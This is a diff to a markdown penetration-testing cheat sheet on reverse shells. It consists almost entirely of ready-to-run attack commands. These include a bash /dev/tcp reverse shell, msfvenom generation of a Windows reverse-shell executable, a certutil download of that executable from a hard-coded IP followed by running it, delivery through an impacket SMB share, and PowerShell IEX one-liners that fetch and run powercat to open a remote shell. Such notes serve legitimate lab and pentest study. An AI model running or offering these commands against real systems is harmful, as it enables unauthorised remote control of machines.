@@ -13,16 +13,37 @@ bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
 ```
 
 ##### Windows
+####  CMD
 ```
 #Generate reverse shell.
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f exe -o <filename.exe>
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f exe -o myshell.exe
 
-#Using powercat and powershell.
-Method 1. IEX (New-Object System.Net.Webclient).DownloadString("http://<ip>/powercat.ps1");powercat -c <host_ip> -p <port> -e powershell
-Method 2. powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://<ip>/powercat.ps1'); powercat -c <ip> -p <port> -e powershell"
+#Transfer reverse shell to your users home directory.
+certutil -urlcache -split -f http://192.168.45.178:80/myshell.exe C:\\users\\<user>\\myshell.exe"
 
+#Execute
+C:\\users\\<user>\\myshell.exe
 ```
 
+### SMB Share
+```
+#Generate reverse shell.
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f exe -o myshell.exe
+
+#Setup smb server.
+impacket-smbserver -smb2support kali $PWD
+
+#Transfer and execute shell.
+//<kali-ip>/kali/myshell.exe
+```
+
+#### Powershell
+
+```
+#Using powercat.
+Method 1. IEX (New-Object System.Net.Webclient).DownloadString("http://<ip>/powercat.ps1");powercat -c <host_ip> -p <port> -e powershell
+Method 2. powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://<ip>/powercat.ps1'); powercat -c <ip> -p <port> -e powershell"
+```
 ###### Base64 Encode
 
 ```
